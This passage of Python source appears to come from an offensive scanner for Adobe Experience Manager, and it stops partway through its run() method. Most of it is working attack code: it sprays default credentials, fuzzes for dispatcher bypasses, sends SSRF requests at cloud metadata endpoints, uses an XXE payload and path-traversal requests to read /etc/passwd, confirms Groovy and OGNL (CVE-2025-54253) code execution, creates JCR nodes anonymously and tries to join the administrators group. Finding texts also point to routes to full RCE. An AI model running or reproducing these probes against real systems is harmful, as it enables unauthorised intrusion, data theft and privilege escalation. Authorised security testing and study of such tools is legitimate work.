                fp["indicators"].append(f"server header: {srv}")

        # Heuristic: /etc/clientlibs/granite/utils.js -> 200 / JS is a strong tell
        r = self.client.get("/etc/clientlibs/granite/utils.js")
        if r is not None and r.status_code == 200 and "granite" in (r.text or "").lower():
            fp["is_aem"] = True
            fp["indicators"].append("/etc/clientlibs/granite/utils.js served")

        # Try author-only marker
        r = self.client.get("/libs/granite/security/currentuser.json")
        if r is not None and r.status_code in (200, 401, 403):
            if r.status_code == 200 and "anonymous" in (r.text or "").lower():
                fp["instance"] = "publish"
            elif r.status_code in (401, 403):
                fp["instance"] = "author"

        self._fingerprint = fp
        if fp["is_aem"]:
            self.logger.good(f"AEM signature confirmed (instance={fp['instance']}, version={fp.get('version')})")
            self.reporter.add(Finding(
                title=f"AEM detected ({fp['instance']} instance)",
                severity=SEV_INFO, category=CAT_FINGERPRINT, target=self.target,
                evidence="; ".join(fp["indicators"][:6]),
                description=f"Server identified as Adobe Experience Manager. Instance type: {fp['instance']}.",
                role=self.role,
            ))
        else:
            self.logger.warn("No clear AEM fingerprint — running anyway, results may be noisy.")
        return fp

    # =======================================================================
    # 2. Default credentials probe
    # =======================================================================
    def check_default_credentials(self) -> None:
        if not self._enabled("creds"):
            return
        self.logger.section("Default credential probe")

        # Establish which probe path actually requires auth on this target
        auth_path = None
        for p in AUTH_PROBE_PATHS:
            r = self.client.get(p)
            if r is not None and r.status_code in (401, 403):
                auth_path = p
                self.logger.info(f"Using {p} as basic-auth probe (baseline {r.status_code})")
                break
        if auth_path is None:
            self.logger.warn("No basic-auth-gated path found; skipping credential probe.")
            return

        for user, password in DEFAULT_CREDENTIALS:
            token = base64.b64encode(f"{user}:{password}".encode()).decode()
            r = self.client.get(auth_path, headers={"Authorization": f"Basic {token}"})
            if r is None:
                continue
            if r.status_code == 200:
                self.reporter.add(Finding(
                    title=f"Default credentials accepted: {user}:{password}",
                    severity=SEV_CRITICAL,
                    category=CAT_AUTH,
                    target=self.target + auth_path,
                    evidence=f"HTTP 200 on {auth_path} with Basic Auth user={user!r}",
                    description=("AEM accepted a well-known default credential. "
                                 "Authenticate against /crx/de or /system/console and "
                                 "expect direct path to OS-level RCE via Felix bundle upload, "
                                 "Groovy console, or CRX package install."),
                    references=[
                        "https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem",
                        "https://github.com/0ang3el/aem-hacker",
                    ],
                    request=f"GET {auth_path} HTTP/1.1\nAuthorization: Basic {token}\n",
                    response_snippet=f"HTTP {r.status_code} | {len(r.content)} bytes",
                    role=self.role,
                ))

    # =======================================================================
    # 3. Exposed endpoint probe
    # =======================================================================
    def check_exposed_endpoints(self) -> None:
        if not self._enabled("exposure"):
            return
        self.logger.section("Exposed endpoint probe")

        def probe(entry):
            path, sev, cat, label, sig = entry
            r = self.client.get(path)
            if r is None:
                return
            if r.status_code not in (200, 401, 403):
                # Even 401 / 403 of /crx/de or /system/console is "exists",
                # but for noise control we only flag 200s by default.
                return
            body = safe_response_text(r, 8000)
            if r.status_code == 200:
                if sig and not re.search(sig, body, re.I):
                    # 200 but not the expected signature — likely a soft 404
                    return
                self.reporter.add(Finding(
                    title=label,
                    severity=sev, category=cat, target=self.target + path,
                    evidence=f"HTTP 200, content-length {len(r.content)}",
                    description=f"Endpoint {path} returned 200 without authentication.",
                    request=self.client.request_signature("GET", path),
                    response_snippet=snippet(body, 600),
                    role=self.role,
                ))
            elif r.status_code in (401, 403) and sig:
                # only flag 401/403 if signature still appears in the body
                if re.search(sig, body, re.I):
                    self.reporter.add(Finding(
                        title=f"{label} (auth-gated but reachable)",
                        severity=SEV_LOW, category=cat, target=self.target + path,
                        evidence=f"HTTP {r.status_code}, signature matched",
                        description=f"Endpoint {path} is reachable but auth-gated. "
                                    "Re-test after capturing valid session cookies.",
                        role=self.role,
                    ))

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe, SENSITIVE_ENDPOINTS))

    # =======================================================================
    # 4. Dispatcher bypass fuzzing
    # =======================================================================
    def check_dispatcher_bypasses(self) -> None:
        if not self._enabled("dispatcher"):
            return
        self.logger.section("Dispatcher bypass fuzzing")

        suffixes = list(BYPASS_SUFFIXES)
        if self.fuzz_aggression == "aggressive":
            # Add extra noise patterns
            extra = []
            for ext in BYPASS_EXTENSIONS:
                extra += [f"%2F..%2F{ext.lstrip('.')}", f"%0a{ext}", f"%00{ext}",
                          f"%20{ext}", f"%2e%2e{ext}", f"//x{ext}"]
            suffixes += extra
        if self.fuzz_aggression == "quick":
            suffixes = [".css", ".js", ".png", ".html", "/a.css", ";.css"]

        def fuzz(target_entry):
            path, label, sev = target_entry
            # Baseline
            r0 = self.client.get(path)
            baseline = (r0.status_code if r0 else None)
            if baseline == 200:
                # already exposed — separate check covers it
                return
            for suffix in suffixes:
                # Insert suffix before any query string
                if "?" in path:
                    base, qs = path.split("?", 1)
                    fuzzed = f"{base}{suffix}?{qs}"
                else:
                    fuzzed = f"{path}{suffix}"
                r = self.client.get(fuzzed)
                if r is None:
                    continue
                if r.status_code == 200 and len(r.content) > 50:
                    body = safe_response_text(r, 2000)
                    # Sanity check that the body looks like the real backend response,
                    # not a 200-OK landing page returned by some proxies.
                    if any(s in body.lower() for s in ("granite", "sling", "querybuilder",
                                                       "felix", "crxde", "groovy",
                                                       "jcr:primarytype", "userid")):
                        self.reporter.add(Finding(
                            title=f"Dispatcher bypass: {label} via suffix '{suffix}'",
                            severity=sev, category=CAT_DISPATCHER,
                            target=self.target + fuzzed,
                            evidence=f"Baseline {baseline} -> bypass 200 ({len(r.content)} bytes)",
                            description=("The dispatcher allowed an unauthenticated request to "
                                         f"{path} when the suffix '{suffix}' was appended. The "
                                         "backend Sling resource resolver ignored the suffix and "
                                         "served the original servlet response."),
                            references=[
                                "https://labs.withsecure.com/advisories/adobe-experience-manager-dispatcher-bypass",
                                "https://blog.assetnote.io/",
                                "https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem",
                            ],
                            request=self.client.request_signature("GET", fuzzed),
                            response_snippet=snippet(body, 600),
                            role=self.role,
                        ))
                        # one hit per endpoint is enough — move on
                        return

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(fuzz, DISPATCHER_TARGETS))

    # =======================================================================
    # 5. Sling info disclosure (.json / .infinity.json dumps)
    # =======================================================================
    def check_sling_info_disclosure(self) -> None:
        if not self._enabled("sling"):
            return
        self.logger.section("Sling info disclosure (.json / .infinity.json)")

        roots = list(SLING_INFO_ROOTS)
        sels = list(SLING_INFO_SELECTORS)
        if self.fuzz_aggression == "quick":
            sels = [".json", ".1.json", ".infinity.json"]

        def probe(combo):
            root, sel = combo
            path = root + sel
            r = self.client.get(path)
            if r is None or r.status_code != 200:
                return
            body = safe_response_text(r, 4000)
            if not body or len(body) < 30:
                return
            # JSON / XML-ish?
            try:
                if sel.endswith(".xml"):
                    if "<?xml" not in body[:200]:
                        return
                else:
                    # quick heuristic - starts with { or [ and contains jcr:
                    stripped = body.lstrip()
                    if not (stripped.startswith("{") or stripped.startswith("[")):
                        return
                    if "jcr:" not in body and "sling:" not in body and "rep:" not in body:
                        return
            except Exception:
                return

            sev = SEV_HIGH if sel in (".infinity.json", ".tidy.infinity.json", ".harray.4.json") else SEV_MEDIUM
            # bump severity for sensitive roots
            if root in ("/etc/cloudservices", "/etc/replication", "/etc/key",
                        "/home/users", "/home/groups"):
                sev = SEV_HIGH
            # Look for likely credentials
            if re.search(r"(?i)(password|secret|access[_-]?key|token|aws|salesforce)", body):
                sev = SEV_CRITICAL

            self.reporter.add(Finding(
                title=f"Sling info disclosure at {path}",
                severity=sev, category=CAT_JCR, target=self.target + path,
                evidence=f"HTTP 200, content-length {len(r.content)}",
                description=("Sling selector served JCR node tree contents to an "
                             "unauthenticated request. Use this to enumerate users, "
                             "groups, replication agents and cloud-service configs."),
                references=[
                    "https://experienceleague.adobe.com/docs/experience-manager-65/developing/introduction/sling-cheatsheet.html",
                    "https://github.com/0ang3el/aem-hacker",
                ],
                request=self.client.request_signature("GET", path),
                response_snippet=snippet(body, 800),
                role=self.role,
            ))

        combos = [(r, s) for r in roots for s in sels]
        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe, combos))

    # =======================================================================
    # 6. QueryBuilder API enumeration
    # =======================================================================
    def check_querybuilder(self) -> None:
        if not self._enabled("querybuilder"):
            return
        self.logger.section("QueryBuilder API probe")

        # Direct hit
        qb_paths = [
            "/bin/querybuilder.json?path=/&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/home/users&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/etc/cloudservices&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/etc/replication&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/var/audit&p.hits=full&p.limit=1",
            "/bin/querybuilder.feed.xml?path=/&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?type=rep:User&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?type=cq:Page&p.hits=full&p.limit=1",
        ]
        for p in qb_paths:
            r = self.client.get(p)
            if r is None:
                continue
            if r.status_code == 200:
                body = safe_response_text(r, 4000)
                if not re.search(r"(?i)(success|hits|results|total)", body):
                    continue
                sev = SEV_HIGH
                if "/home/users" in p or "type=rep:User" in p:
                    sev = SEV_CRITICAL
                if "/etc/cloudservices" in p:
                    sev = SEV_CRITICAL
                self.reporter.add(Finding(
                    title=f"QueryBuilder API exposed: {p}",
                    severity=sev, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence=f"HTTP 200 | {len(r.content)} bytes | matched 'success/hits'",
                    description=("/bin/querybuilder.json is reachable unauthenticated. "
                                 "Iterate p.offset + p.limit to enumerate the entire JCR "
                                 "or filter by type (rep:User, cq:Page, dam:Asset)."),
                    references=[
                        "https://hackerone.com/reports/1247163",
                        "https://github.com/0ang3el/aem-hacker",
                    ],
                    request=self.client.request_signature("GET", p),
                    response_snippet=snippet(body, 700),
                    role=self.role,
                ))

    # =======================================================================
    # 7. Groovy Console RCE attempt
    # =======================================================================
    def check_groovy_console(self) -> None:
        if not self._enabled("groovy"):
            return
        self.logger.section("Groovy Console probe")

        for p in ("/bin/groovyconsole", "/bin/groovyconsole.html",
                  "/etc/groovyconsole.html"):
            r = self.client.get(p)
            if r is None:
                continue
            if r.status_code == 200 and "Groovy" in (r.text or ""):
                # Try an actual RCE probe (echo-only, no system commands)
                payload = "out.println('AEM-HUNTER-CANARY-' + System.getProperty('user.name'))"
                rce = self.client.post("/bin/groovyconsole/post.json",
                                       data={"script": payload})
                if rce is not None and "AEM-HUNTER-CANARY" in (rce.text or ""):
                    self.reporter.add(Finding(
                        title="Groovy Console RCE confirmed",
                        severity=SEV_CRITICAL, category=CAT_RCE,
                        target=self.target + "/bin/groovyconsole/post.json",
                        evidence="Canary echo via Groovy executed unauthenticated.",
                        description=("ACS Commons Groovy Console is enabled and reachable. "
                                     "Posting a script to /bin/groovyconsole/post.json gives "
                                     "instant OS-level RCE as the AEM service user."),
                        references=[
                            "https://adobe-consulting-services.github.io/acs-aem-commons/features/groovy-console/index.html",
                        ],
                        request=f"POST /bin/groovyconsole/post.json HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nscript={up.quote(payload)}",
                        response_snippet=snippet(rce.text, 500),
                        role=self.role,
                    ))
                else:
                    self.reporter.add(Finding(
                        title="Groovy Console UI exposed",
                        severity=SEV_HIGH, category=CAT_RCE,
                        target=self.target + p,
                        evidence="200 OK with 'Groovy' in body, but post.json execution blocked.",
                        description=("Groovy Console interface is reachable. Even if "
                                     "/post.json is currently denied, an authenticated "
                                     "low-priv user may be able to execute scripts."),
                        request=self.client.request_signature("GET", p),
                        response_snippet=safe_response_text(r, 500),
                        role=self.role,
                    ))
                return

    # =======================================================================
    # 8. SSRF endpoints
    # =======================================================================
    def check_ssrf_endpoints(self) -> None:
        if not self._enabled("ssrf"):
            return
        self.logger.section("SSRF endpoint probe")

        canary_targets = [
            ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
            ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata"),
            ("http://127.0.0.1:4502/system/console", "loopback Felix console"),
            ("http://127.0.0.1:8080/", "loopback 8080"),
        ]

        for tmpl, param, label, cve in SSRF_TARGETS:
            for canary, canary_label in canary_targets:
                encoded = up.quote(canary, safe="")
                path = tmpl.format(u=encoded)
                r = self.client.get(path)
                if r is None:
                    continue
                body = safe_response_text(r, 2000)
                hit_signature = False
                if "ami-id" in body or "instance-id" in body:  # AWS
                    hit_signature = True
                if "Metadata-Flavor" in body or "computeMetadata" in body:
                    hit_signature = True
                if "Apache Felix" in body or "OSGi" in body:
                    hit_signature = True
                if "<title>Apache" in body and r.status_code == 200:
                    hit_signature = True
                # Some endpoints reflect status of probed URL
                if (r.status_code == 200 and len(r.content) > 200 and
                        ("status" in body.lower() or "error" in body.lower()
                         or "code" in body.lower())):
                    # weaker signal — only flag at LOW
                    weak = True
                else:
                    weak = False

                if hit_signature:
                    self.reporter.add(Finding(
                        title=f"SSRF via {label} -> {canary_label}",
                        severity=SEV_CRITICAL if "169.254" in canary else SEV_HIGH,
                        category=CAT_SSRF, target=self.target + path,
                        cve=cve,
                        evidence=f"Response contains target service signature for {canary}",
                        description=("The endpoint accepted an attacker-controlled URL "
                                     "and proxied the request server-side. This pivots "
                                     "into internal networks and cloud metadata services."),
                        references=[
                            "https://hackerone.com/reports/698991",
                            "https://nvd.nist.gov/vuln/detail/CVE-2018-5006",
                        ],
                        request=self.client.request_signature("GET", path),
                        response_snippet=snippet(body, 600),
                        role=self.role,
                    ))
                    return  # one strong hit per SSRF target is enough
                elif weak:
                    self.reporter.add(Finding(
                        title=f"Possible SSRF on {label}",
                        severity=SEV_LOW, category=CAT_SSRF,
                        target=self.target + path,
                        cve=cve,
                        evidence="Endpoint accepted external URL parameter (weak signal).",
                        description=("Endpoint accepted an external URL but response did "
                                     "not contain a reliable internal-service signature. "
                                     "Re-test with a Burp Collaborator / interactsh canary."),
                        request=self.client.request_signature("GET", path),
                        response_snippet=snippet(body, 400),
                        role=self.role,
                    ))

    # =======================================================================
    # 9. WebDAV / CRX Package Manager XXE probe
    # =======================================================================
    def check_webdav_xxe(self) -> None:
        if not self._enabled("xxe"):
            return
        self.logger.section("WebDAV / Package Manager XXE probe")

        xxe_payload = (
            "<?xml version=\"1.0\"?>"
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
            "<D:propfind xmlns:D=\"DAV:\"><D:prop><D:displayname>&xxe;</D:displayname>"
            "</D:prop></D:propfind>"
        )
        for p in ("/crx/server/crx.default", "/crx/server/", "/crx/repository/crx.default"):
            r = self.client.request("PROPFIND", p, data=xxe_payload,
                                    headers={"Content-Type": "application/xml",
                                             "Depth": "0"})
            if r is None:
                continue
            body = safe_response_text(r, 2000)
            if "root:" in body or "/bin/bash" in body:
                self.reporter.add(Finding(
                    title="XXE in CRX WebDAV PROPFIND",
                    severity=SEV_CRITICAL, category=CAT_XXE,
                    target=self.target + p,
                    cve="CVE-2025-54254",
                    evidence="Response contained /etc/passwd contents.",
                    description=("PROPFIND on the CRX WebDAV endpoint parsed an external "
                                 "entity and reflected the contents of /etc/passwd. "
                                 "Pivot to AWS metadata or arbitrary file read."),
                    references=[
                        "https://hackerone.com/reports/436555",
                        "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    ],
                    request=f"PROPFIND {p} HTTP/1.1\nContent-Type: application/xml\nDepth: 0\n\n{xxe_payload}",
                    response_snippet=snippet(body, 600),
                    role=self.role,
                ))
                return
            elif r.status_code in (200, 207):
                self.reporter.add(Finding(
                    title="CRX WebDAV PROPFIND accepted XML input",
                    severity=SEV_MEDIUM, category=CAT_XXE,
                    target=self.target + p,
                    evidence=f"HTTP {r.status_code} on PROPFIND",
                    description=("WebDAV endpoint accepted custom PROPFIND XML. Confirm "
                                 "out-of-band XXE with a Collaborator / interactsh URL."),
                    request=f"PROPFIND {p}",
                    response_snippet=snippet(body, 400),
                    role=self.role,
                ))

    # =======================================================================
    # 10. CVE-2025-54253 — AEM Forms JEE OGNL injection / RCE
    # =======================================================================
    def check_cve_2025_54253(self) -> None:
        if not self._enabled("cve"):
            return
        self.logger.section("CVE-2025-54253 (AEM Forms JEE /adminui/debug OGNL)")

        # Step 1: presence
        r = self.client.get("/adminui/debug")
        if r is None or r.status_code in (404,):
            self.logger.debug("/adminui/debug not present.")
            return
        baseline_status = r.status_code

        if r.status_code == 200:
            self.reporter.add(Finding(
                title="AEM Forms JEE debug console reachable (CVE-2025-54253)",
                severity=SEV_CRITICAL, category=CAT_CVE,
                target=self.target + "/adminui/debug",
                cve="CVE-2025-54253",
                evidence="HTTP 200 on /adminui/debug without authentication.",
                description=("Pre-auth AEM Forms on JEE debug console. Build chain via "
                             "OGNL injection in `pluginAction` parameter -> RCE. Added to "
                             "CISA KEV in late 2025."),
                references=[
                    "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    "https://helpx.adobe.com/security/products/aem/apsb25-50.html",
                ],
                request=self.client.request_signature("GET", "/adminui/debug"),
                response_snippet=safe_response_text(r, 500),
                role=self.role,
            ))

        # Step 2: try a benign OGNL evaluation that should yield a deterministic
        # marker. We do NOT execute system commands.
        marker = "AEMHUNTER" + "".join(random.choices(string.ascii_uppercase, k=6))
        payload = f"pluginAction=%23a%3d%22{marker}%22"
        url = "/adminui/debug?debug=true&" + payload
        r2 = self.client.get(url)
        if r2 is not None and marker in (r2.text or ""):
            self.reporter.add(Finding(
                title="CVE-2025-54253 OGNL evaluation confirmed",
                severity=SEV_CRITICAL, category=CAT_CVE,
                target=self.target + url,
                cve="CVE-2025-54253",
                evidence=f"Marker '{marker}' reflected in response after OGNL evaluation.",
                description=("/adminui/debug evaluated an OGNL expression and reflected "
                             "the result. This is unauthenticated remote code execution."),
                references=[
                    "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
                ],
                request=self.client.request_signature("GET", url),
                response_snippet=snippet(r2.text, 500),
                role=self.role,
            ))
        else:
            self.logger.debug(f"/adminui/debug baseline {baseline_status}, OGNL marker not reflected.")

    # =======================================================================
    # 11. CVE-2018-5006 / CVE-2018-12809 quick checks
    # =======================================================================
    def check_legacy_cves(self) -> None:
        if not self._enabled("cve"):
            return
        self.logger.section("Legacy AEM CVE probes")

        # CVE-2018-5006 — SalesforceSecretServlet
        r = self.client.get("/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url=http://127.0.0.1:4502")
        if r is not None and r.status_code == 200 and ("error" in (r.text or "").lower()
                                                       or "Apache" in (r.text or "")):
            self.reporter.add(Finding(
                title="SalesforceSecretServlet reachable (CVE-2018-5006)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/libs/mcm/salesforce/customer.json",
                cve="CVE-2018-5006",
                evidence=f"HTTP 200 with internal hit signature",
                description=("Legacy MCM Salesforce connector accepted instance_url. "
                             "SSRF pivot into internal services / cloud metadata."),
                references=["https://nvd.nist.gov/vuln/detail/CVE-2018-5006"],
                request=self.client.request_signature(
                    "GET",
                    "/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url=...",
                ),
                response_snippet=safe_response_text(r, 400),
                role=self.role,
            ))

        # CVE-2018-12809 — ReportingServicesServlet
        r = self.client.get("/etc/reports/userreport.html?path=http://127.0.0.1:4502/system/console")
        if r is not None and r.status_code == 200 and "Apache" in (r.text or ""):
            self.reporter.add(Finding(
                title="ReportingServicesServlet SSRF (CVE-2018-12809)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/etc/reports/userreport.html",
                cve="CVE-2018-12809",
                evidence="Reporting servlet proxied internal request signature.",
                description="AEM Reporting servlet allowed attacker-controlled path -> SSRF.",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2018-12809"],
                request=self.client.request_signature("GET", "/etc/reports/userreport.html?path=..."),
                response_snippet=safe_response_text(r, 400),
                role=self.role,
            ))

        # CVE-2021-43762 — path traversal / feature bypass to admin areas
        for path in ("/libs/granite/core/content/login.html/../../../../etc/passwd",
                     "/etc/..%2f..%2fetc%2fpasswd",
                     "/content/../../../../../../etc/passwd"):
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and "root:" in (r.text or ""):
                self.reporter.add(Finding(
                    title="Path traversal (CVE-2021-43762 family)",
                    severity=SEV_CRITICAL, category=CAT_CVE,
                    target=self.target + path,
                    cve="CVE-2021-43762",
                    evidence="/etc/passwd content reflected.",
                    description="AEM mishandled normalization and served /etc/passwd.",
                    references=["https://nvd.nist.gov/vuln/detail/CVE-2021-43762"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=safe_response_text(r, 400),
                    role=self.role,
                ))
                break

    # =======================================================================
    # 12. Sling POST servlet abuse
    # =======================================================================
    def check_sling_post_servlet(self) -> None:
        if not self._enabled("slingpost"):
            return
        self.logger.section("Sling POST servlet probe")

        # Test if anon can write under /content/usergenerated or /content/aem-hunter
        marker = "aem-hunter-" + "".join(random.choices(string.ascii_lowercase, k=6))
        for base in ("/content/usergenerated", "/content/aem-hunter-test",
                     "/var/dam/aem-hunter", "/etc/aem-hunter-test"):
            path = f"{base}/{marker}"
            r = self.client.post(path, data={"jcr:primaryType": "nt:unstructured",
                                             "marker": marker})
            if r is None:
                continue
            if r.status_code in (200, 201):
                # confirm by re-GETting
                v = self.client.get(path + ".json")
                if v is not None and v.status_code == 200 and marker in (v.text or ""):
                    self.reporter.add(Finding(
                        title=f"Sling POST servlet allows arbitrary node creation at {base}",
                        severity=SEV_CRITICAL, category=CAT_JCR,
                        target=self.target + path,
                        evidence=f"Created node {path} and confirmed via GET .json",
                        description=("The Sling POST servlet accepted an unauthenticated "
                                     "POST that created a JCR node. With JCR write access "
                                     "an attacker can add themselves to administrators via "
                                     ":member=, alter content, or upload arbitrary files."),
                        references=[
                            "https://sling.apache.org/documentation/bundles/manipulating-content-the-slingpostservlet-servlets-post.html",
                            "https://github.com/0ang3el/aem-hacker",
                        ],
                        request=f"POST {path} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\njcr:primaryType=nt:unstructured&marker={marker}",
                        response_snippet=safe_response_text(r, 400),
                        role=self.role,
                    ))
                    # cleanup attempt
                    self.client.post(path, data={":operation": "delete"})
                    return
            elif r.status_code == 500 and "javax.jcr" in (r.text or "").lower():
                # JCR error means we reached the post servlet but were denied —
                # still worth a low informational note
                self.reporter.add(Finding(
                    title=f"Sling POST servlet reachable at {base}",
                    severity=SEV_LOW, category=CAT_JCR,
                    target=self.target + path,
                    evidence=f"HTTP 500 with javax.jcr trace",
                    description="Anonymous POST reached the Sling POST servlet but was denied. "
                                "Worth retrying with low-priv role cookies.",
                    role=self.role,
                ))

    # =======================================================================
    # 13. Source code disclosure tricks
    # =======================================================================
    def check_source_disclosure(self) -> None:
        if not self._enabled("source"):
            return
        self.logger.section("Source code / clientlib disclosure")

        # Append .source or .servlet to JSP-backed paths to read raw template
        candidates = [
            "/libs/granite/core/content/login.html.source",
            "/libs/granite/core/content/login.html.servlet",
            "/libs/wcm/core/content/sites/sites.html.source",
            "/etc/clientlibs/granite/utils.js.source",
            "/apps.source.json",
            "/content.source.json",
        ]
        for p in candidates:
            r = self.client.get(p)
            if r is None or r.status_code != 200:
                continue
            body = safe_response_text(r, 2000)
            if any(s in body for s in ("<%@", "<%=", "<%", "jsp:", "package ", "import com.adobe")):
                self.reporter.add(Finding(
                    title=f"Source code disclosure at {p}",
                    severity=SEV_MEDIUM, category=CAT_DISCLOSURE,
                    target=self.target + p,
                    evidence="Response contains JSP / Java source markers.",
                    description="Source-disclosure selectors leaked raw template / class source.",
                    request=self.client.request_signature("GET", p),
                    response_snippet=snippet(body, 600),
                    role=self.role,
                ))

    # =======================================================================
    # 14. CSRF token grab (for authenticated POST modules)
    # =======================================================================
    def fetch_csrf_token(self) -> Optional[str]:
        r = self.client.get("/libs/granite/csrf/token.json")
        if r is None or r.status_code != 200:
            return None
        try:
            data = r.json()
            tok = data.get("token")
            if tok:
                self._csrf_token = tok
                self.client.session.headers["CSRF-Token"] = tok
                self.logger.debug(f"CSRF token: {tok[:12]}...")
                return tok
        except Exception:
            return None
        return None

    # =======================================================================
    # 15. Authenticated role check — what can this role reach?
    # =======================================================================
    def check_authenticated_role(self) -> None:
        if not self._enabled("role") or not self.role:
            return
        self.logger.section(f"Authenticated role probe ({self.role})")

        # 15a — fetch CSRF token
        self.fetch_csrf_token()

        # 15b — Who am I?
        r = self.client.get("/libs/granite/security/currentuser.json")
        if r is not None and r.status_code == 200:
            body = safe_response_text(r, 2000)
            self.reporter.add(Finding(
                title=f"Role '{self.role}' authenticated as: see evidence",
                severity=SEV_INFO, category=CAT_ROLE,
                target=self.target + "/libs/granite/security/currentuser.json",
                evidence=snippet(body, 400),
                description="Identity associated with provided cookies.",
                role=self.role,
            ))

        # 15c — Reach admin-only endpoints to test privilege boundary
        admin_only = [
            ("/system/console/bundles.json",          SEV_CRITICAL, "OSGi bundles JSON"),
            ("/crx/de/index.jsp",                     SEV_CRITICAL, "CRXDE Lite"),
            ("/crx/packmgr/list.jsp",                 SEV_HIGH,     "Package list"),
            ("/etc/replication.json",                 SEV_HIGH,     "Replication agents"),
            ("/etc/cloudservices.infinity.json",      SEV_CRITICAL, "Cloud services tree"),
            ("/libs/granite/security/post/authorizables.json", SEV_HIGH, "Authorizables"),
            ("/home/users.1.json",                    SEV_HIGH,     "Users tree"),
            ("/home/groups.1.json",                   SEV_HIGH,     "Groups tree"),
            ("/bin/groovyconsole.html",               SEV_CRITICAL, "Groovy Console"),
            ("/var/audit.json",                       SEV_MEDIUM,   "Audit log"),
        ]
        for path, sev, label in admin_only:
            r = self.client.get(path)
            if r is None:
                continue
            if r.status_code == 200 and len(r.content) > 80:
                body = safe_response_text(r, 2000)
                # filter common 'login' redirect bodies
                if "j_username" in body.lower() or "please log in" in body.lower():
                    continue
                self.reporter.add(Finding(
                    title=f"Role '{self.role}' can reach admin surface: {label}",
                    severity=sev, category=CAT_ROLE,
                    target=self.target + path,
                    evidence=f"HTTP 200 with {len(r.content)} bytes",
                    description=(f"Role '{self.role}' should not be able to view {label}. "
                                 "Privilege boundary violation — flag for the team."),
                    request=self.client.request_signature("GET", path),
                    response_snippet=snippet(body, 600),
                    role=self.role,
                ))

        # 15d — Try to add ourselves to administrators
        if self._csrf_token:
            payload = {"addMembers": "administrators"}
            r = self.client.post("/home/users/a/admin.rw.html",
                                 data=payload, headers={"CSRF-Token": self._csrf_token})
            if r is not None and r.status_code in (200, 201):
                body = safe_response_text(r, 500)
                if "error" not in body.lower():
                    self.reporter.add(Finding(
                        title=f"Role '{self.role}' may be able to escalate via :member=",
                        severity=SEV_CRITICAL, category=CAT_ROLE,
                        target=self.target + "/home/users/a/admin.rw.html",
                        evidence=f"POST accepted with status {r.status_code}",
                        description=("Privilege escalation — Sling POST servlet accepted a "
                                     "group-membership change. Manually validate by listing "
                                     "administrators afterwards."),
                        role=self.role,
                    ))

    # =======================================================================
    # 16. Bundle upload attempt (authenticated, opt-in / aggressive)
    # =======================================================================
    def check_bundle_upload(self) -> None:
        if not self._enabled("bundle") or not self.role:
            return
        # Note: We do NOT upload a payload bundle. We only test whether the
        # POST endpoint is reachable.
        r = self.client.post("/system/console/bundles", data={"action": "install"})
        if r is None:
            return
        if r.status_code in (200, 302):
            # The console returning 302 to login is benign; only 200 is interesting
            if r.status_code == 200 and "Felix" in (r.text or ""):
                self.reporter.add(Finding(
                    title=f"Role '{self.role}' can POST to /system/console/bundles",
                    severity=SEV_CRITICAL, category=CAT_ROLE,
                    target=self.target + "/system/console/bundles",
                    evidence="POST returned 200 with Felix body.",
                    description=("Authenticated role can submit bundle actions on the OSGi "
                                 "console. With a malicious OSGi bundle, this becomes "
                                 "instant RCE as the AEM service user."),
                    references=["https://github.com/0ang3el/aem-rce-bundle"],
                    request=self.client.request_signature("POST", "/system/console/bundles"),
                    response_snippet=safe_response_text(r, 400),
                    role=self.role,
                ))

    # =======================================================================
    # 17. Misc: robots.txt + sitemap.xml + headers
    # =======================================================================
    def check_misc(self) -> None:
        if not self._enabled("misc"):
            return
        self.logger.section("Misc / headers")

        for p in ("/robots.txt", "/sitemap.xml", "/etc/map.json", "/.well-known/security.txt"):
            r = self.client.get(p)
            if r is not None and r.status_code == 200 and len(r.content) > 0:
                self.reporter.add(Finding(
                    title=f"{p} reachable",
                    severity=SEV_INFO, category=CAT_DISCLOSURE,
                    target=self.target + p,
                    evidence=f"HTTP 200 | {len(r.content)} bytes",
                    description="Informational — useful for recon / scoping.",
                    response_snippet=safe_response_text(r, 600),
                    role=self.role,
                ))

        # Check for missing security headers on the homepage
        r = self.client.get("/")
        if r is not None:
            missing = []
            for h in ("Content-Security-Policy", "Strict-Transport-Security",
                      "X-Frame-Options", "X-Content-Type-Options",
                      "Referrer-Policy", "Permissions-Policy"):
                if h not in r.headers:
                    missing.append(h)
            if missing:
                self.reporter.add(Finding(
                    title="Missing security headers on root",
                    severity=SEV_LOW, category=CAT_MISCONFIG,
                    target=self.target + "/",
                    evidence="Missing: " + ", ".join(missing),
                    description="Defensive headers absent.",
                    role=self.role,
                ))

    # =======================================================================
    # Orchestrator
    # =======================================================================
    def run(self) -> None:
        try:
            self.fingerprint()
            self.check_default_credentials()
            self.check_exposed_endpoints()
            self.check_dispatcher_bypasses()
            self.check_sling_info_disclosure()
            self.check_querybuilder()
            self.check_groovy_console()
